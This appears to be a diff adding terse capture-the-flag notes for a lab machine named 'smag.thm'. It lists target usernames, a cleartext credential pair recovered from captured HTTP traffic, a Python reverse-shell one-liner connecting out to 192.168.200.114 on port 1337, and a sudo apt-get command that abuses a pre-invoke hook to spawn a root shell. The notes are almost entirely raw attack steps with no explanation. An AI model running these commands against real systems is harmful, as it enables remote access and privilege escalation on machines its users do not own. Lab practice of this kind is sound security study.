@@ -1,0 +1,20 @@
+USERNAMES: uzi,jake,netadmin
+
+--> view-source:http://10.67.167.39/aW1wb3J0YW50/dHJhY2Uy.pcap
+USERNAME: helpdesk
+PASSWORD: cH4nG3M3_n0w
+
+POST /login.php HTTP/1.1
+Host: development.smag.thm
+User-Agent: curl/7.47.0
+Accept: */*
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+--> http://development.smag.thm/
+USERNAME: helpdesk
+PASSWORD: cH4nG3M3_n0w
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.200.114",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
